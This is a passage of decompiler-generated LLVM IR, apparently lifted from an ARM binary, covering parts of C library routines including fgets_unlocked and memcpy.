  %v3_169e4 = load i8, i8* %v2_169e4, align 1
  %v4_169e4 = zext i8 %v3_169e4 to i32
  %v1_169e8 = add nsw i32 %v3_169d0, -1
  store i32 %v1_169e8, i32* %r2.global-to-local, align 4
  store i32 %v4_169e4, i32* %r0.global-to-local, align 4
  %v2_169f4 = add i32 %v2_16a10, 40
  %v3_169f4 = inttoptr i32 %v2_169f4 to i32*
  store i32 0, i32* %v3_169f4, align 4
  %v0_169f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_169f8 = trunc i32 %v0_169f8 to i16
  %v2_169f8 = load i32, i32* @r4, align 4
  %v3_169f8 = inttoptr i32 %v2_169f8 to i16*
  store i16 %v1_169f8, i16* %v3_169f8, align 2
  br label %dec_label_pc_16a9c

dec_label_pc_16a00:                               ; preds = %dec_label_pc_169d0
  %v1_16a00 = add i32 %v2_16a10, 16
  %v1_16a04 = inttoptr i32 %v1_16a00 to i32*
  %v2_16a04 = load i32, i32* %v1_16a04, align 4
  store i32 %v2_16a04, i32* @r1, align 4
  %v3_16a04 = add i32 %v2_16a10, 20
  %v4_16a04 = inttoptr i32 %v3_16a04 to i32*
  %v5_16a04 = load i32, i32* %v4_16a04, align 4
  %v9_16a08 = icmp eq i32 %v5_16a04, %v2_16a04
  br i1 %v9_16a08, label %dec_label_pc_16a18, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16a00
  %v2_16a0c = inttoptr i32 %v2_16a04 to i8*
  %v3_16a0c = load i8, i8* %v2_16a0c, align 1
  %v4_16a0c = zext i8 %v3_16a0c to i32
  store i32 %v4_16a0c, i32* %r0.global-to-local, align 4
  %v6_16a0c = add i32 %v2_16a04, 1
  store i32 %v6_16a0c, i32* @r1, align 4
  store i32 %v6_16a0c, i32* %v1_16a04, align 4
  br label %dec_label_pc_16a9c

dec_label_pc_16a18:                               ; preds = %dec_label_pc_16a00
  %v1_16a18 = add i32 %v2_16a10, 4
  %v2_16a18 = inttoptr i32 %v1_16a18 to i32*
  %v3_16a18 = load i32, i32* %v2_16a18, align 4
  %v7_16a1c = icmp eq i32 %v3_16a18, -2
  br i1 %v7_16a1c, label %.thread7, label %dec_label_pc_16a30

.thread7:                                         ; preds = %dec_label_pc_16a18
  %v2_16a20 = or i16 %v2_169d0, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_16a20, i16* %v1_169d0, align 2
  br label %dec_label_pc_16a9c

dec_label_pc_16a30:                               ; preds = %dec_label_pc_16a18
  %v1_16a30 = and i32 %v3_169d0, 768
  %v2_16a30 = icmp eq i32 %v1_16a30, 0
  br i1 %v2_16a30, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_16a30
  %v1_16a38 = load i32, i32* @r5, align 4
  %v3_16a38 = add i32 %v1_16a38, 76
  %v4_16a38 = inttoptr i32 %v3_16a38 to i32*
  %v5_16a38 = load i32, i32* %v4_16a38, align 4
  store i32 %v5_16a38, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_16a30, %bb23
  store i32 92736, i32* @lr, align 4
  %v1_16a3c = xor i1 %v2_16a30, true
  call void @__pseudo_cond_branch(i1 %v1_16a3c, i32 ptrtoint (i32* @global_var_165d8.604 to i32))
  %v0_16a40 = load i32, i32* @r4, align 4
  %v1_16a40 = add i32 %v0_16a40, 8
  store i32 %v1_16a40, i32* %r2.global-to-local, align 4
  %v1_16a44 = inttoptr i32 %v1_16a40 to i32*
  %v2_16a44 = load i32, i32* %v1_16a44, align 4
  store i32 %v2_16a44, i32* %r2.global-to-local, align 4
  %v3_16a44 = add i32 %v0_16a40, 12
  %v4_16a44 = inttoptr i32 %v3_16a44 to i32*
  %v5_16a44 = load i32, i32* %v4_16a44, align 4
  %v9_16a48 = icmp eq i32 %v5_16a44, %v2_16a44
  br i1 %v9_16a48, label %dec_label_pc_16a7c, label %dec_label_pc_16a50

dec_label_pc_16a50:                               ; preds = %.thread9
  %v2_16a50 = add i32 %v0_16a40, 24
  %v3_16a50 = inttoptr i32 %v2_16a50 to i32*
  store i32 %v2_16a44, i32* %v3_16a50, align 4
  %v0_16a54 = load i32, i32* @r4, align 4
  store i32 %v0_16a54, i32* %r0.global-to-local, align 4
  %v2_16a58 = call i32 @__stdio_rfill(i32 %v0_16a54)
  store i32 %v2_16a58, i32* %r0.global-to-local, align 4
  %v2_16a5c = icmp eq i32 %v2_16a58, 0
  br i1 %v2_16a5c, label %dec_label_pc_16a98, label %dec_label_pc_16a64

dec_label_pc_16a64:                               ; preds = %dec_label_pc_16a50
  %v0_16a64 = load i32, i32* @r4, align 4
  %v1_16a64 = add i32 %v0_16a64, 20
  %v2_16a64 = inttoptr i32 %v1_16a64 to i32*
  %v3_16a64 = load i32, i32* %v2_16a64, align 4
  %v2_16a68 = add i32 %v0_16a64, 24
  %v3_16a68 = inttoptr i32 %v2_16a68 to i32*
  store i32 %v3_16a64, i32* %v3_16a68, align 4
  %v0_16a6c = load i32, i32* @r4, align 4
  %v1_16a6c = add i32 %v0_16a6c, 16
  %v2_16a6c = inttoptr i32 %v1_16a6c to i32*
  %v3_16a6c = load i32, i32* %v2_16a6c, align 4
  %v1_16a70 = inttoptr i32 %v3_16a6c to i8*
  %v2_16a70 = load i8, i8* %v1_16a70, align 1
  %v3_16a70 = zext i8 %v2_16a70 to i32
  store i32 %v3_16a70, i32* %r0.global-to-local, align 4
  %v5_16a70 = add i32 %v3_16a6c, 1
  store i32 %v5_16a70, i32* %v2_16a6c, align 4
  br label %dec_label_pc_16a9c

dec_label_pc_16a7c:                               ; preds = %.thread9
  %v1_16a7c = inttoptr i32 %v0_16a40 to i16*
  store i32 %v0_16a40, i32* %r0.global-to-local, align 4
  %v2_16a80 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_16a80, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_16a88 = call i32 @__stdio_READ(i16* %v1_16a7c, i32 %v2_16a80, i32 1)
  store i32 %v5_16a88, i32* %r0.global-to-local, align 4
  %v2_16a8c = icmp eq i32 %v5_16a88, 0
  br i1 %v2_16a8c, label %dec_label_pc_16a98, label %bb24

bb24:                                             ; preds = %dec_label_pc_16a7c
  %v4_16a90 = load i8, i8* %stack_var_-17, align 1
  %v5_16a90 = sext i8 %v4_16a90 to i32
  store i32 %v5_16a90, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16a9c

dec_label_pc_16a98:                               ; preds = %dec_label_pc_16a7c, %dec_label_pc_169c0, %dec_label_pc_16a50
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16a9c

dec_label_pc_16a9c:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_16a64, %dec_label_pc_169dc, %dec_label_pc_16a98
  %v2_16aa0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16aa0, i32* @r4, align 4
  store i32 %v6_16984, i32* @r5, align 4
  store i32 %v9_16984, i32* @lr, align 4
  %v1_16aa4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16aa4

; uselistorder directives
  uselistorder i32 %v2_16a04, { 1, 0, 2, 3 }
  uselistorder i32 %v2_16a10, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_16988, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 12, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 11, 13 }
  uselistorder i32 768, { 2, 0, 3, 1, 4 }
  uselistorder label %dec_label_pc_16a9c, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_16a98, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_16ab0 = load i32, i32* @r6, align 4
  %v12_16ab0 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16ab4 = icmp eq i32 %arg2, 0
  store i1 %v2_16ab4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_16b3c, label %dec_label_pc_16b24.preheader

dec_label_pc_16b24.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_16b242 = add i32 %arg2, -1
  store i32 %v1_16b242, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_16b248 = icmp eq i32 %arg2, 1
  store i1 %v7_16b248, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16b248, label %dec_label_pc_16b2c, label %dec_label_pc_16ad0

dec_label_pc_16ad0:                               ; preds = %dec_label_pc_16b24.preheader, %dec_label_pc_16b24.backedge.dec_label_pc_16ad0_crit_edge
  %v0_16af4 = phi i32 [ %v0_16ad0.pre, %dec_label_pc_16b24.backedge.dec_label_pc_16ad0_crit_edge ], [ %arg3, %dec_label_pc_16b24.preheader ]
  %v1_16ad0 = add i32 %v0_16af4, 16
  %v2_16ad0 = inttoptr i32 %v1_16ad0 to i32*
  %v3_16ad0 = load i32, i32* %v2_16ad0, align 4
  store i32 %v3_16ad0, i32* %r2.global-to-local, align 4
  %v1_16ad4 = add i32 %v0_16af4, 24
  %v2_16ad4 = inttoptr i32 %v1_16ad4 to i32*
  %v3_16ad4 = load i32, i32* %v2_16ad4, align 4
  store i32 %v3_16ad4, i32* %r3.global-to-local, align 4
  %v3_16ad8 = icmp uge i32 %v3_16ad0, %v3_16ad4
  store i1 %v3_16ad8, i1* %cpsr_c.global-to-local, align 1
  %v9_16ad8 = icmp eq i32 %v3_16ad0, %v3_16ad4
  store i1 %v9_16ad8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_16ad8, label %dec_label_pc_16af4, label %dec_label_pc_16ae0

dec_label_pc_16ae0:                               ; preds = %dec_label_pc_16ad0
  %v1_16ae0 = inttoptr i32 %v3_16ad0 to i8*
  %v2_16ae0 = load i8, i8* %v1_16ae0, align 1
  %v3_16ae0 = zext i8 %v2_16ae0 to i32
  store i32 %v3_16ae0, i32* %r3.global-to-local, align 4
  %v5_16ae0 = add i32 %v3_16ad0, 1
  store i32 %v5_16ae0, i32* %r2.global-to-local, align 4
  %v2_16ae4 = load i32, i32* @r5, align 4
  %v3_16ae4 = inttoptr i32 %v2_16ae4 to i8*
  store i8 %v2_16ae0, i8* %v3_16ae4, align 1
  %v4_16ae4 = load i32, i32* @r5, align 4
  %v5_16ae4 = add i32 %v4_16ae4, 1
  store i32 %v5_16ae4, i32* @r5, align 4
  %v0_16ae8 = load i32, i32* %r3.global-to-local, align 4
  %v2_16ae8 = icmp ugt i32 %v0_16ae8, 9
  store i1 %v2_16ae8, i1* %cpsr_c.global-to-local, align 1
  %v7_16ae8 = icmp eq i32 %v0_16ae8, 10
  store i1 %v7_16ae8, i1* %cpsr_z.global-to-local, align 1
  %v0_16aec = load i32, i32* %r2.global-to-local, align 4
  %v1_16aec = load i32, i32* @r4, align 4
  %v2_16aec = add i32 %v1_16aec, 16
  %v3_16aec = inttoptr i32 %v2_16aec to i32*
  store i32 %v0_16aec, i32* %v3_16aec, align 4
  br i1 %v7_16ae8, label %dec_label_pc_16b2c, label %dec_label_pc_16b24.backedge

dec_label_pc_16af4:                               ; preds = %dec_label_pc_16ad0
  %v1_16af4 = inttoptr i32 %v0_16af4 to i16*
  %v3_16af8 = call i32 @getc_unlocked(i16* %v1_16af4)
  %v3_16afc = icmp eq i32 %v3_16af8, -1
  store i1 %v3_16afc, i1* %cpsr_c.global-to-local, align 1
  %v8_16afc = icmp eq i32 %v3_16af8, -1
  store i1 %v8_16afc, i1* %cpsr_z.global-to-local, align 1
  %v1_16b00 = urem i32 %v3_16af8, 256
  store i32 %v1_16b00, i32* %r3.global-to-local, align 4
  br i1 %v3_16afc, label %dec_label_pc_16b08, label %dec_label_pc_16b20

dec_label_pc_16b08:                               ; preds = %dec_label_pc_16af4
  %v0_16b08 = load i32, i32* @r4, align 4
  %v1_16b08 = inttoptr i32 %v0_16b08 to i16*
  %v2_16b08 = load i16, i16* %v1_16b08, align 2
  %v3_16b08 = zext i16 %v2_16b08 to i32
  store i32 %v3_16b08, i32* %r3.global-to-local, align 4
  %v1_16b0c = and i32 %v3_16b08, 8
  %v2_16b0c = icmp eq i32 %v1_16b0c, 0
  store i1 %v2_16b0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b0c, label %dec_label_pc_16b2c, label %dec_label_pc_16b3c

dec_label_pc_16b20:                               ; preds = %dec_label_pc_16af4
  %v1_16b18 = trunc i32 %v3_16af8 to i8
  %v2_16b18 = load i32, i32* @r5, align 4
  %v3_16b18 = inttoptr i32 %v2_16b18 to i8*
  store i8 %v1_16b18, i8* %v3_16b18, align 1
  %v4_16b18 = load i32, i32* @r5, align 4
  %v5_16b18 = add i32 %v4_16b18, 1
  store i32 %v5_16b18, i32* @r5, align 4
  %v0_16b1c = load i32, i32* %r3.global-to-local, align 4
  %v2_16b1c = icmp ugt i32 %v0_16b1c, 9
  store i1 %v2_16b1c, i1* %cpsr_c.global-to-local, align 1
  %v7_16b1c = icmp eq i32 %v0_16b1c, 10
  store i1 %v7_16b1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16b1c, label %dec_label_pc_16b2c, label %dec_label_pc_16b24.backedge

dec_label_pc_16b24.backedge:                      ; preds = %dec_label_pc_16b20, %dec_label_pc_16ae0
  %v0_16b24 = load i32, i32* @r6, align 4
  %v1_16b24 = add i32 %v0_16b24, -1
  store i32 %v1_16b24, i32* @r6, align 4
  %v2_16b24 = icmp ne i32 %v0_16b24, 0
  store i1 %v2_16b24, i1* %cpsr_c.global-to-local, align 1
  %v7_16b24 = icmp eq i32 %v0_16b24, 1
  store i1 %v7_16b24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16b24, label %dec_label_pc_16b2c, label %dec_label_pc_16b24.backedge.dec_label_pc_16ad0_crit_edge

dec_label_pc_16b24.backedge.dec_label_pc_16ad0_crit_edge: ; preds = %dec_label_pc_16b24.backedge
  %v0_16ad0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16ad0

dec_label_pc_16b2c:                               ; preds = %dec_label_pc_16b20, %dec_label_pc_16b24.backedge, %dec_label_pc_16ae0, %dec_label_pc_16b24.preheader, %dec_label_pc_16b08
  %v0_16b2c = load i32, i32* @r5, align 4
  %v1_16b2c = load i32, i32* @r7, align 4
  %v3_16b2c = icmp uge i32 %v0_16b2c, %v1_16b2c
  store i1 %v3_16b2c, i1* %cpsr_c.global-to-local, align 1
  %v9_16b2c = icmp eq i32 %v0_16b2c, %v1_16b2c
  store i1 %v9_16b2c, i1* %cpsr_z.global-to-local, align 1
  %v2_16b30 = xor i1 %v9_16b2c, true
  %v3_16b30 = and i1 %v3_16b2c, %v2_16b30
  br i1 %v3_16b30, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_16b2c
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_16b34 = inttoptr i32 %v0_16b2c to i8*
  store i8 0, i8* %v7_16b34, align 1
  %v0_16b38.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_16b38.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_16b2c, %bb
  %v1_16b38 = phi i1 [ %v1_16b38.pre, %bb ], [ %v9_16b2c, %dec_label_pc_16b2c ]
  %v0_16b38 = phi i1 [ %v0_16b38.pre, %bb ], [ %v3_16b2c, %dec_label_pc_16b2c ]
  %v2_16b38 = xor i1 %v1_16b38, true
  %v3_16b38 = and i1 %v0_16b38, %v2_16b38
  br i1 %v3_16b38, label %.dec_label_pc_16b40_crit_edge, label %dec_label_pc_16b3c

.dec_label_pc_16b40_crit_edge:                    ; preds = %.thread14
  %v0_16b40.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16b40

dec_label_pc_16b3c:                               ; preds = %entry, %dec_label_pc_16b08, %.thread14
  br label %dec_label_pc_16b40

dec_label_pc_16b40:                               ; preds = %.dec_label_pc_16b40_crit_edge, %dec_label_pc_16b3c
  %v0_16b40 = phi i32 [ %v0_16b40.pre, %.dec_label_pc_16b40_crit_edge ], [ 0, %dec_label_pc_16b3c ]
  store i32 %v9_16ab0, i32* @r6, align 4
  store i32 %v12_16ab0, i32* @r7, align 4
  ret i32 %v0_16b40

; uselistorder directives
  uselistorder i1 %v9_16b2c, { 1, 0, 2 }
  uselistorder i32 %v1_16b2c, { 1, 0 }
  uselistorder i32 %v0_16b2c, { 0, 2, 1 }
  uselistorder i32 %v0_16b24, { 2, 0, 1 }
  uselistorder i32 %v0_16b1c, { 1, 0 }
  uselistorder i32 %v3_16af8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_16ae8, { 1, 0 }
  uselistorder i32 %v3_16ad0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_16af4, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_16b40, { 1, 0 }
  uselistorder label %dec_label_pc_16b3c, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_16b2c, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_16ad0, { 1, 0 }
}

define i32 @_memcpy() local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_16b50 = load i32, i32* @r1, align 4
  %v1_16b50 = load i32, i32* @r0, align 4
  %v2_16b50 = sub i32 %v0_16b50, %v1_16b50
  %v3_16b50 = icmp ult i32 %v0_16b50, %v1_16b50
  %v4_16b50 = xor i32 %v1_16b50, %v0_16b50
  %v5_16b50 = xor i32 %v2_16b50, %v0_16b50
  %v6_16b50 = and i32 %v5_16b50, %v4_16b50
  %v7_16b50 = icmp slt i32 %v6_16b50, 0
  store i1 %v7_16b50, i1* %cpsr_v.global-to-local, align 1
  %v8_16b50 = icmp slt i32 %v2_16b50, 0
  store i1 %v8_16b50, i1* %cpsr_n.global-to-local, align 1
  %v9_16b50 = icmp eq i32 %v0_16b50, %v1_16b50
  store i1 %v9_16b50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_16b50, label %dec_label_pc_16da4, label %dec_label_pc_16b58

dec_label_pc_16b58:                               ; preds = %entry
  br i1 %v9_16b50, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_16b58
  %merge = phi i32 [ %v0_16b50, %dec_label_pc_16b58 ], [ %v2_16e38, %bb150 ], [ %v11_16e54, %bb153 ], [ %v7_16e54, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_16b58
  %v5_16b5c = inttoptr i32 %v1_16b50 to i8*
  store i8* %v5_16b5c, i8** %stack_var_-8, align 4
  %v8_16b5c = load i32, i32* @lr, align 4
  %v0_16b60 = load i32, i32* @r2, align 4
  %v2_16b60 = add i32 %v0_16b60, -4
  store i32 %v2_16b60, i32* %r2.global-to-local, align 4
  %v4_16b60 = sub i32 3, %v0_16b60
  %v5_16b60 = and i32 %v4_16b60, %v0_16b60
  %v6_16b60 = icmp slt i32 %v5_16b60, 0
  store i1 %v6_16b60, i1* %cpsr_v.global-to-local, align 1
  %v7_16b60 = icmp slt i32 %v2_16b60, 0
  store i1 %v7_16b60, i1* %cpsr_n.global-to-local, align 1
  %v8_16b60 = icmp eq i32 %v0_16b60, 4
  store i1 %v8_16b60, i1* %cpsr_z.global-to-local, align 1
  %v5_16b64 = icmp slt i32 %v0_16b60, 4
  br i1 %v5_16b64, label %bb140, label %dec_label_pc_16b68

dec_label_pc_16b68:                               ; preds = %bb
  %v1_16b68 = urem i32 %v1_16b50, 4
  store i32 %v1_16b68, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16b68 = icmp eq i32 %v1_16b68, 0
  store i1 %v2_16b68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b68, label %dec_label_pc_16b70, label %dec_label_pc_16c1c

dec_label_pc_16b70:                               ; preds = %dec_label_pc_16b68
  %v1_16b70 = urem i32 %v0_16b50, 4
  store i32 %v1_16b70, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16b70 = icmp eq i32 %v1_16b70, 0
  store i1 %v2_16b70, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_16b50 to i2
  br i1 %v2_16b70, label %dec_label_pc_16b78, label %dec_label_pc_16c4c

dec_label_pc_16b78:                               ; preds = %dec_label_pc_16b70, %dec_label_pc_16c44
  %v0_16b9094 = phi i32 [ %v1_16b50, %dec_label_pc_16b70 ], [ %v0_16d6c77, %dec_label_pc_16c44 ]
  %v0_16b8c93 = phi i32 [ %v0_16b50, %dec_label_pc_16b70 ], [ %v0_16c44, %dec_label_pc_16c44 ]
  %v0_16b78 = phi i32 [ %v2_16b60, %dec_label_pc_16b70 ], [ %v2_16c3c, %dec_label_pc_16c44 ]
  %v1_16b78 = add i32 %v0_16b78, -8
  store i32 %v1_16b78, i32* %r2.global-to-local, align 4
  %v3_16b78 = sub i32 7, %v0_16b78
  %v4_16b78 = and i32 %v3_16b78, %v0_16b78
  %v5_16b78 = icmp slt i32 %v4_16b78, 0
  store i1 %v5_16b78, i1* %cpsr_v.global-to-local, align 1
  %v6_16b78 = icmp slt i32 %v1_16b78, 0
  store i1 %v6_16b78, i1* %cpsr_n.global-to-local, align 1
  %v7_16b78 = icmp eq i32 %v0_16b78, 8
  store i1 %v7_16b78, i1* %cpsr_z.global-to-local, align 1
  %v2_16b7c = xor i1 %v6_16b78, %v5_16b78
  br i1 %v2_16b7c, label %dec_label_pc_16bcc, label %dec_label_pc_16b80

dec_label_pc_16b80:                               ; preds = %dec_label_pc_16b78
  %v1_16b80 = add i32 %v0_16b78, -28
  store i32 %v1_16b80, i32* %r2.global-to-local, align 4
  %v3_16b80 = sub i32 27, %v0_16b78
  %v4_16b80 = and i32 %v3_16b80, %v1_16b78
  %v5_16b80 = icmp slt i32 %v4_16b80, 0
  store i1 %v5_16b80, i1* %cpsr_v.global-to-local, align 1
  %v6_16b80 = icmp slt i32 %v1_16b80, 0
  store i1 %v6_16b80, i1* %cpsr_n.global-to-local, align 1
  %v7_16b80 = icmp eq i32 %v1_16b78, 20
  store i1 %v7_16b80, i1* %cpsr_z.global-to-local, align 1
  %v2_16b84 = xor i1 %v6_16b80, %v5_16b80
  br i1 %v2_16b84, label %dec_label_pc_16bb8, label %dec_label_pc_16b88

dec_label_pc_16b88:                               ; preds = %dec_label_pc_16b80
  %v0_16b88 = load i32, i32* @r4, align 4
  store i32 %v0_16b88, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16b8c

dec_label_pc_16b8c:                               ; preds = %dec_label_pc_16b8c.dec_label_pc_16b8c_crit_edge, %dec_label_pc_16b88
  %v0_16b90 = phi i32 [ %v12_16b98, %dec_label_pc_16b8c.dec_label_pc_16b8c_crit_edge ], [ %v0_16b9094, %dec_label_pc_16b88 ]
  %v0_16b8c = phi i32 [ %v0_16b8c.pre, %dec_label_pc_16b8c.dec_label_pc_16b8c_crit_edge ], [ %v0_16b8c93, %dec_label_pc_16b88 ]
  %v1_16b8c = inttoptr i32 %v0_16b8c to i32*
  %v2_16b8c = load i32, i32* %v1_16b8c, align 4
  %v3_16b8c = add i32 %v0_16b8c, 4
  %v4_16b8c = inttoptr i32 %v3_16b8c to i32*
  %v5_16b8c = load i32, i32* %v4_16b8c, align 4
  store i32 %v5_16b8c, i32* %r4.global-to-local, align 4
  %v6_16b8c = add i32 %v0_16b8c, 8
  %v7_16b8c = inttoptr i32 %v6_16b8c to i32*
  %v8_16b8c = load i32, i32* %v7_16b8c, align 4
  store i32 %v8_16b8c, i32* %ip.global-to-local, align 4
  %v9_16b8c = add i32 %v0_16b8c, 12
  %v10_16b8c = inttoptr i32 %v9_16b8c to i32*
  %v11_16b8c = load i32, i32* %v10_16b8c, align 4
  store i32 %v11_16b8c, i32* %lr.global-to-local, align 4
  %v12_16b8c = add i32 %v0_16b8c, 16
  store i32 %v12_16b8c, i32* %r1.global-to-local, align 4
  %v1_16b90 = inttoptr i32 %v0_16b90 to i32*
  store i32 %v2_16b8c, i32* %v1_16b90, align 4
  %v3_16b90 = add i32 %v0_16b90, 4
  %v4_16b90 = inttoptr i32 %v3_16b90 to i32*
  %v5_16b90 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16b90, i32* %v4_16b90, align 4
  %v6_16b90 = add i32 %v0_16b90, 8
  %v7_16b90 = inttoptr i32 %v6_16b90 to i32*
  %v8_16b90 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_16b90, i32* %v7_16b90, align 4
  %v9_16b90 = add i32 %v0_16b90, 12
  %v10_16b90 = inttoptr i32 %v9_16b90 to i32*
  %v11_16b90 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_16b90, i32* %v10_16b90, align 4
  %v12_16b90 = add i32 %v0_16b90, 16
  store i32 %v12_16b90, i32* %r0.global-to-local, align 4
  %v0_16b94 = load i32, i32* %r1.global-to-local, align 4
  %v1_16b94 = inttoptr i32 %v0_16b94 to i32*
  %v2_16b94 = load i32, i32* %v1_16b94, align 4
  store i32 %v2_16b94, i32* @r3, align 4
  %v3_16b94 = add i32 %v0_16b94, 4
  %v4_16b94 = inttoptr i32 %v3_16b94 to i32*
  %v5_16b94 = load i32, i32* %v4_16b94, align 4
  store i32 %v5_16b94, i32* %r4.global-to-local, align 4
  %v6_16b94 = add i32 %v0_16b94, 8
  %v7_16b94 = inttoptr i32 %v6_16b94 to i32*
  %v8_16b94 = load i32, i32* %v7_16b94, align 4
  store i32 %v8_16b94, i32* @ip, align 4
  %v9_16b94 = add i32 %v0_16b94, 12
  %v10_16b94 = inttoptr i32 %v9_16b94 to i32*
  %v11_16b94 = load i32, i32* %v10_16b94, align 4
  store i32 %v11_16b94, i32* %lr.global-to-local, align 4
  %v12_16b94 = add i32 %v0_16b94, 16
  store i32 %v12_16b94, i32* @r1, align 4
  %v1_16b98 = inttoptr i32 %v12_16b90 to i32*
  store i32 %v2_16b94, i32* %v1_16b98, align 4
  %v3_16b98 = add i32 %v0_16b90, 20
  %v4_16b98 = inttoptr i32 %v3_16b98 to i32*
  %v5_16b98 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16b98, i32* %v4_16b98, align 4
  %v6_16b98 = add i32 %v0_16b90, 24
  %v7_16b98 = inttoptr i32 %v6_16b98 to i32*
  %v8_16b98 = load i32, i32* @ip, align 4
  store i32 %v8_16b98, i32* %v7_16b98, align 4
  %v9_16b98 = add i32 %v0_16b90, 28
  %v10_16b98 = inttoptr i32 %v9_16b98 to i32*
  %v11_16b98 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_16b98, i32* %v10_16b98, align 4
  %v12_16b98 = add i32 %v0_16b90, 32
  store i32 %v12_16b98, i32* @r0, align 4
  %v0_16b9c = load i32, i32* %r2.global-to-local, align 4
  %v1_16b9c = add i32 %v0_16b9c, -32
  store i32 %v1_16b9c, i32* %r2.global-to-local, align 4
  %v3_16b9c = sub i32 31, %v0_16b9c
  %v4_16b9c = and i32 %v3_16b9c, %v0_16b9c
  %v5_16b9c = icmp slt i32 %v4_16b9c, 0
  %v6_16b9c = icmp slt i32 %v1_16b9c, 0
  %v2_16ba0 = xor i1 %v6_16b9c, %v5_16b9c
  br i1 %v2_16ba0, label %dec_label_pc_16ba4, label %dec_label_pc_16b8c.dec_label_pc_16b8c_crit_edge

dec_label_pc_16b8c.dec_label_pc_16b8c_crit_edge:  ; preds = %dec_label_pc_16b8c
  %v0_16b8c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_16b8c

dec_label_pc_16ba4:                               ; preds = %dec_label_pc_16b8c
  %v1_16ba4 = add i32 %v0_16b9c, -16
  %v3_16ba4 = add i32 %v0_16b9c, 2147483616
  %v4_16ba4 = and i32 %v1_16ba4, %v3_16ba4
  %v5_16ba4 = icmp slt i32 %v4_16ba4, 0
  store i1 %v5_16ba4, i1* %cpsr_v.global-to-local, align 1
  %v6_16ba4 = icmp slt i32 %v1_16ba4, 0
  store i1 %v6_16ba4, i1* %cpsr_n.global-to-local, align 1
  %v7_16ba4 = icmp eq i32 %v1_16ba4, 0
